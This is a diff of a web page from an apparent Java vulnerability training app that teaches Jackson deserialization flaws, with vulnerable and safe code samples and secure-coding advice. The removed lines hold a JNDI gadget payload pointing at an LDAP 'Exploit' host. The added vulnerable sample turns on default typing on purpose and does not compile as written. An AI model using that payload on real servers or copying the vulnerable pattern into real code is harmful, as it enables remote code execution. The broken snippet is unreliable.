@@ -11,56 +11,67 @@
         <!-- 侧边栏 -->
         <div th:replace="~{commons/commons::siderbar(active='jackson.html')}"></div>
 
-        <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">
-            <div class="vul_header">
-                <span>组件漏洞 - Jackson反序列化</span>
-            </div>
-            <hr>
-            <ul class="nav nav-tabs">
-                <li class="nav-item">
-                    <a class="nav-link active" data-toggle="tab" href="#aa"><span class="lnr lnr-bug"></span> 漏洞描述</a>
-                </li>
-                <li class="nav-item">
-                    <a class="nav-link" data-toggle="tab" href="#bb"><span class="lnr lnr-bullhorn"></span> 安全编码</a>
-                </li>
-            </ul>
-
-            <div class="tab-content">
-                <div class="tab-pane dec shadow-sm p-3 mb-4 rounded active" id="aa">
-                    Jackson是一套开源的java序列化与反序列化工具框架，可将java对象序列化为xml和json格式的字符串并提供对应的反序列化过程。由于其解析效率较高，Jackson目前是Spring
-                    MVC中内置使用的解析方式。
+        <main role="main" class="col-md-10 offset-md-2 pt-3 main">
+            <div class="card">
+                <div class="card-header py-1">
+                    <div class="vul_header">
+                        <span>组件漏洞 - Jackson反序列化</span>
+                    </div>
                 </div>
-                <div class="tab-pane fade" id="bb">
-                    <textarea disabled="disabled" class="form-control shadow-sm p-3 mb-5 rounded" id="coder" style="height: 180px;">
-方案一、对于第三方依赖组件，需要及时更新版本
-方案二、
-    (1) 禁止开启DefaultTyping功能。
-    (2) 禁止使用JsonTypeInfo.Id.CLASS注解值。
-    (3) 禁止使用JsonTypeInfo.Id.MINIMAL_CLASS注解值
-升级到较高版本的JDK
-                    </textarea>
+
+                <div class="card-body">
+                    <ul class="nav nav-tabs">
+                        <li class="nav-item">
+                            <a class="nav-link active" data-toggle="tab" href="#vulDescription">
+                                漏洞描述</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" data-toggle="tab" href="#secureCoding"> 安全编码</a>
+                        </li>
+                    </ul>
+
+                    <div class="tab-content">
+                        <div class="tab-pane active" id="vulDescription">
+                            <div class="alert alert-desc"><i class="lnr lnr-alarm"></i>
+                                Jackson是一套开源的java序列化与反序列化工具框架，可将java对象序列化为xml和json格式的字符串并提供对应的反序列化过程。由于其解析效率较高，Jackson目前是Spring
+                                MVC中内置使用的解析方式。
+                            </div>
+                        </div>
+                        <div class="tab-pane fade" id="secureCoding">
+                            <div class="alert alert-desc">
+                                <li>方案一、及时更新Jackson库和第三方依赖组件</li>
+                                <li>方案二、使用如下配置</li>
+                                (1) 禁止开启DefaultTyping功能。<br>
+                                (2) 禁止使用JsonTypeInfo.Id.CLASS注解值。<br>
+                                (3) 禁止使用JsonTypeInfo.Id.MINIMAL_CLASS注解值
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
-
-            <hr>
 
             <div class="box-float">
                 <div class="float1">
-                    <a style="float:right" class="btn btn-sm btn-danger"
-                       href="/Jackson/vul">运行</a>
+                    <a target="_blank" style="float:right" class="btn btn-sm btn-danger" onclick="submitJSON()">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span>
+                    </a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码</span></h5>
 
                     <textarea class="form-control" id="code1">
-public void vul() {
+@RequestMapping("/vul")
+public void vul(@RequestBody String content) {
     try {
-        String payload = "[\"com.nqadmin.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":\"true\"}]";
-
         ObjectMapper mapper = new ObjectMapper();
         mapper.enableDefaultTyping();
-        Object o = mapper.readValue(payload, Object.class);
+        Person o = mapper.readValue(payload, Person.class);
         mapper.writeValueAsString(o);
+        return o.toString();
     } catch (Exception e) {
-        e.printStackTrace();
+        return e.toString();
     }
 }
                     </textarea>
@@ -68,16 +79,27 @@ public void vul() {
                 </div>
 
                 <div class="float2">
-
+                    <form style="float:right" onsubmit="submitJSONSafe()">
+                        <input class="btn btn-sm btn-success" type="submit" value="Run">
+                    </form>
                     <h5><span class="lnr lnr-smile"> 安全代码</span></h5>
-                    <textarea class="form-control" id="code2">
-// 尽量升级最新版本来解决漏洞，如不能再采用方案二
-
-<dependency>
-    <groupId>com.fasterxml.jackson.core</groupId>
-    <artifactId>jackson-databind</artifactId>
-    <version>最新版</version>
-</dependency>
+                    <label for="code2"> </label><textarea class="form-control" id="code2">
+/**
+ * 升级到最新版本，或者使用以下配置
+ * (1) 禁止开启DefaultTyping功能。
+ * (2) 禁止使用JsonTypeInfo.Id.CLASS注解值。
+ * (3) 禁止使用JsonTypeInfo.Id.MINIMAL_CLASS注解值。
+*/
+public String safe(@RequestBody String content) {
+    try {
+        ObjectMapper mapper = new ObjectMapper();
+        Person o = mapper.readValue(content, Person.class);
+        mapper.writeValueAsString(o);
+        return o.toString();
+    } catch (Exception e) {
+        return e.toString();
+    }
+}
                     </textarea>
                 </div>
 
@@ -86,8 +108,36 @@ public void vul() {
     </div>
 </div>
 
-<!-- 引入script -->
 <div th:replace="~{commons/commons::script}"></div>
+
+<script>
+    const json = JSON.stringify({
+        "name": "wang",
+        "age": 12,
+        "obj": "payload"
+    });
+
+    function submitJSON() {
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', '/vulnapi/Jackson/vul/', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+
+        xhr.onreadystatechange = function () {
+            if (this.readyState === XMLHttpRequest.DONE) {
+                // 将服务器返回的结果显示在页面上
+                document.getElementById("result").innerText = this.responseText;
+            }
+        };
+        xhr.send(json);
+    }
+
+    function submitJSONSafe() {
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', '/vulnapi/Jackson/safe', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(json);
+    }
+</script>
 
 
 </body>
